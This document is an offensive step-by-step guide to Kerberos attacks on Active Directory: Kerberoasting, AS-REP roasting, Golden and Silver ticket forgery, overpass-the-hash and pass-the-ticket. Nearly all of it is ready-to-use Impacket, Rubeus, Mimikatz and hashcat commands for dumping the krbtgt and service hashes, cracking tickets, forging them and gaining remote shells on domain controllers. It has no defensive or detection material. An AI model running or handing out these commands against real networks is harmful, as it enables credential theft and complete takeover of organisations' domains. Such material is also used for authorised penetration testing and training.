# Kerberos Attacks Walkthrough

Step-by-step guide for executing Kerberos-based attacks in Active Directory environments.

## Attack 1: Kerberoasting

Kerberoasting targets service accounts with SPNs. Any authenticated user can request a TGS for any service, and the ticket is encrypted with the service account's password hash.

### Step 1: Identify Kerberoastable Accounts

```bash
# Using Impacket GetUserSPNs.py (list only)
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.10

# Example output:
# ServicePrincipalName                 Name         MemberOf
# ----------------------------------  -----------  --------
# MSSQLSvc/sql01.domain.local:1433    svc_sql      CN=Domain Admins
# HTTP/web01.domain.local             svc_web
# LDAP/dc01.domain.local              svc_ldap
```

```powershell
# Using PowerView
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Using Rubeus (stats)
.\Rubeus.exe kerberoast /stats

# Output shows encryption types used (RC4 is weaker)
```

### Step 2: Request Service Tickets

```bash
# Request all SPNs and save hashes (Linux)
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.10 -request -outputfile tgs_hashes.txt

# Request specific SPN
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.10 -request-user svc_sql

# Using hash authentication
GetUserSPNs.py domain.local/user -hashes :NTLM_HASH -dc-ip 192.168.1.10 -request
```

```powershell
# Using Rubeus - all SPNs
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Specific user
.\Rubeus.exe kerberoast /user:svc_sql /outfile:hash.txt

# Only RC4 encrypted tickets (easier to crack)
.\Rubeus.exe kerberoast /rc4opsec

# Output format compatible with hashcat
.\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
```

### Step 3: Crack the Hashes

```bash
# Hashcat - Kerberos 5 TGS-REP (hashcat mode 13100)
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules for better coverage
hashcat -m 13100 tgs_hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# For AES256 tickets (mode 19700)
hashcat -m 19700 aes_hashes.txt wordlist.txt

# Using John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt tgs_hashes.txt
```

### Kerberoasting Best Practices

1. **Prioritize high-value accounts** - Domain Admins, service accounts with admin access
2. **Target RC4 encryption** - Much faster to crack than AES
3. **Use good wordlists** - rockyou, SecLists, custom wordlists
4. **Apply rules** - Password patterns increase success rate

---

## Attack 2: AS-REP Roasting

AS-REP Roasting targets accounts with Kerberos pre-authentication disabled. These accounts return encrypted AS-REP without proving identity.

### Step 1: Find Vulnerable Accounts

```bash
# Using Impacket GetNPUsers.py (requires user list)
GetNPUsers.py domain.local/ -dc-ip 192.168.1.10 -usersfile users.txt -format hashcat -outputfile asrep.txt

# If you have credentials, enumerate first
GetNPUsers.py domain.local/user:password -dc-ip 192.168.1.10

# Without credentials (need user list)
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -no-pass -dc-ip 192.168.1.10
```

```powershell
# Using PowerView - find vulnerable users
Get-DomainUser -UACFilter DONT_REQ_PREAUTH

# Using Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Specific user
.\Rubeus.exe asreproast /user:vulnerable_user
```

### Step 2: Crack the Hashes

```bash
# Hashcat - Kerberos 5 AS-REP (mode 18200)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule

# John the Ripper
john --wordlist=rockyou.txt asrep.txt
```

### AS-REP Roasting Without Credentials

If you don't have domain credentials, you can still attempt AS-REP roasting:

```bash
# Generate username list from various sources
# - Email addresses from OSINT
# - LinkedIn employee names
# - Company website
# - Metadata from documents

# Username formats to try
first.last
flast
lastf
first_last
first-last

# Use kerbrute for user enumeration first
kerbrute userenum --dc 192.168.1.10 -d domain.local users.txt

# Then AS-REP roast valid users
GetNPUsers.py domain.local/ -usersfile valid_users.txt -format hashcat -no-pass
```

---

## Attack 3: Golden Ticket

Golden Tickets are forged TGTs that provide complete domain access. They require the krbtgt hash.

### Prerequisites

To create a Golden Ticket, you need:
1. **krbtgt NTLM hash** - From DCSync, NTDS.dit extraction, or Mimikatz
2. **Domain SID** - Can be obtained from any domain user
3. **Domain name** - FQDN

### Step 1: Obtain krbtgt Hash

```bash
# Using secretsdump.py (DCSync)
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user krbtgt

# Output:
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a2b3c4d5e6f7890abcdef...
```

```powershell
# Using Mimikatz (on DC or with DCSync rights)
mimikatz # lsadump::dcsync /user:krbtgt

# Output includes NTLM hash
```

### Step 2: Get Domain SID

```bash
# Using lookupsid.py
lookupsid.py domain.local/user:password@dc01.domain.local 0
# Output: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX

# Using rpcclient
rpcclient -U 'domain\user%password' dc01.domain.local -c "lsaquery"
```

```powershell
# PowerShell
(Get-ADDomain).DomainSID.Value

# PowerView
Get-DomainSID
```

### Step 3: Create Golden Ticket

```bash
# Using Impacket ticketer.py
ticketer.py -nthash KRBTGT_NTLM_HASH -domain-sid S-1-5-21-XXX-XXX-XXX \
    -domain domain.local Administrator

# Specify groups (default includes Domain Admins)
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX-XXX-XXX \
    -domain domain.local -groups 512,513,518,519,520 Administrator

# Output: Administrator.ccache
export KRB5CCNAME=Administrator.ccache
```

```powershell
# Using Mimikatz
mimikatz # kerberos::golden /user:Administrator /domain:domain.local \
    /sid:S-1-5-21-XXX-XXX-XXX /krbtgt:KRBTGT_NTLM_HASH /ticket:golden.kirbi

# With specific groups
mimikatz # kerberos::golden /user:Administrator /domain:domain.local \
    /sid:S-1-5-21-XXX-XXX-XXX /krbtgt:KRBTGT_HASH \
    /groups:512,513,518,519,520 /ticket:golden.kirbi
```

### Step 4: Use Golden Ticket

```bash
# Set credential cache
export KRB5CCNAME=Administrator.ccache

# Use with Impacket tools
psexec.py domain.local/Administrator@dc01.domain.local -k -no-pass
wmiexec.py domain.local/Administrator@dc01.domain.local -k -no-pass
smbexec.py domain.local/Administrator@dc01.domain.local -k -no-pass

# Access shares
smbclient //dc01.domain.local/C$ -k -no-pass
```

```powershell
# Using Mimikatz - inject ticket
mimikatz # kerberos::ptt golden.kirbi

# Using Rubeus
.\Rubeus.exe ptt /ticket:golden.kirbi

# Verify
klist

# Access resources
dir \\dc01.domain.local\c$
```

---

## Attack 4: Silver Ticket

Silver Tickets are forged service tickets. They're more targeted than Golden Tickets and harder to detect.

### Prerequisites

1. **Service account NTLM hash** - For the specific service
2. **Domain SID**
3. **Target SPN**

### Step 1: Obtain Service Account Hash

Common service accounts and their SPNs:

| Service | SPN Format | Useful For |
|---------|-----------|------------|
| CIFS/SMB | CIFS/hostname | File access |
| HTTP | HTTP/hostname | Web services |
| LDAP | LDAP/hostname | Directory queries |
| HOST | HOST/hostname | General access |
| MSSQL | MSSQLSvc/hostname:1433 | Database access |
| WinRM | HTTP/hostname (or HOST) | Remote management |

```bash
# Get computer account hash (for CIFS, HOST, etc.)
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user 'DC01$'

# Or service account
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user svc_sql
```

### Step 2: Create Silver Ticket

```bash
# Using Impacket ticketer.py for CIFS access
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-XXX-XXX-XXX \
    -domain domain.local -spn CIFS/dc01.domain.local Administrator

# For HTTP/WinRM access
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-XXX-XXX-XXX \
    -domain domain.local -spn HTTP/dc01.domain.local Administrator

# Export and use
export KRB5CCNAME=Administrator.ccache
```

```powershell
# Using Mimikatz for CIFS
mimikatz # kerberos::golden /user:Administrator /domain:domain.local \
    /sid:S-1-5-21-XXX-XXX-XXX /target:dc01.domain.local \
    /service:CIFS /rc4:SERVICE_HASH /ticket:silver.kirbi

# For HOST (PSRemoting)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local \
    /sid:S-1-5-21-XXX-XXX-XXX /target:dc01.domain.local \
    /service:HOST /rc4:SERVICE_HASH /ticket:silver_host.kirbi

# For HTTP (WinRM)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local \
    /sid:S-1-5-21-XXX-XXX-XXX /target:dc01.domain.local \
    /service:HTTP /rc4:SERVICE_HASH /ticket:silver_http.kirbi
```

### Step 3: Use Silver Ticket

```bash
# Set ticket
export KRB5CCNAME=Administrator.ccache

# Access CIFS
smbclient //dc01.domain.local/C$ -k -no-pass
```

```powershell
# Inject ticket
mimikatz # kerberos::ptt silver.kirbi

# Access file share
dir \\dc01.domain.local\c$

# For HTTP/WinRM access
Enter-PSSession -ComputerName dc01.domain.local
```

---

## Attack 5: Overpass-the-Hash / Pass-the-Key

Convert an NTLM hash into a Kerberos ticket, enabling Kerberos-based lateral movement.

### Step 1: Obtain NTLM Hash

```bash
# From secretsdump
secretsdump.py domain.local/admin:password@192.168.1.100

# From SAM dump
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

```powershell
# Using Mimikatz
mimikatz # sekurlsa::logonpasswords
# Note the NTLM hash for target user
```

### Step 2: Request TGT with Hash

```bash
# Using Impacket getTGT.py
getTGT.py domain.local/user -hashes :NTLM_HASH -dc-ip 192.168.1.10

# Output: user.ccache
export KRB5CCNAME=user.ccache

# Now use with any Impacket tool
psexec.py domain.local/user@target.domain.local -k -no-pass
```

```powershell
# Using Mimikatz
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local \
    /ntlm:NTLM_HASH /run:powershell.exe

# Using Rubeus
.\Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /ptt

# Verify ticket
klist
```

### AES Keys (More Stealthy)

```bash
# Request with AES256 key
getTGT.py domain.local/user -aesKey AES256_KEY -dc-ip 192.168.1.10
```

```powershell
# Mimikatz with AES key
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local \
    /aes256:AES256_KEY /run:powershell.exe

# Rubeus with AES
.\Rubeus.exe asktgt /user:Administrator /aes256:AES256_KEY /ptt
```

---

## Attack 6: Pass-the-Ticket

Use a stolen Kerberos ticket for authentication.

### Step 1: Extract Tickets

```powershell
# Using Mimikatz - export all tickets
mimikatz # sekurlsa::tickets /export

# Using Rubeus - dump current session tickets
.\Rubeus.exe dump

# Specific user's tickets
.\Rubeus.exe dump /user:Administrator
```

### Step 2: Convert Ticket Format (if needed)

```bash
# Convert .kirbi (Windows) to .ccache (Linux)
ticketConverter.py ticket.kirbi ticket.ccache

# Convert .ccache to .kirbi
ticketConverter.py ticket.ccache ticket.kirbi
```

### Step 3: Use the Ticket

```bash
# Linux - set credential cache
export KRB5CCNAME=/path/to/ticket.ccache

# Use with Impacket
psexec.py domain.local/user@target.domain.local -k -no-pass
```

```powershell
# Windows - inject ticket
mimikatz # kerberos::ptt ticket.kirbi

# Or Rubeus
.\Rubeus.exe ptt /ticket:BASE64_TICKET
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Verify
klist
```

---

## Troubleshooting

### Common Errors

**KRB_AP_ERR_SKEW - Clock skew too great**
```bash
# Sync time with DC
sudo ntpdate dc01.domain.local
# Or
sudo rdate -n dc01.domain.local
```

**KDC_ERR_S_PRINCIPAL_UNKNOWN**
```bash
# Check SPN is correct and exists
# Verify hostname resolution
nslookup target.domain.local
```

**Ticket not accepted**
```bash
# Verify ticket is valid
klist -c ticket.ccache

# Check ticket hasn't expired
# Default TGT lifetime is 10 hours
```

**Module 'krb5' not found**
```bash
# Install Kerberos libraries
sudo apt install krb5-user libkrb5-dev
```

### Verification Commands

```bash
# List tickets in cache
klist

# Verify Kerberos config
cat /etc/krb5.conf

# Test Kerberos authentication
kinit user@DOMAIN.LOCAL
```

```powershell
# List tickets
klist

# Purge tickets
klist purge

# Get current user's tickets
klist tickets
```
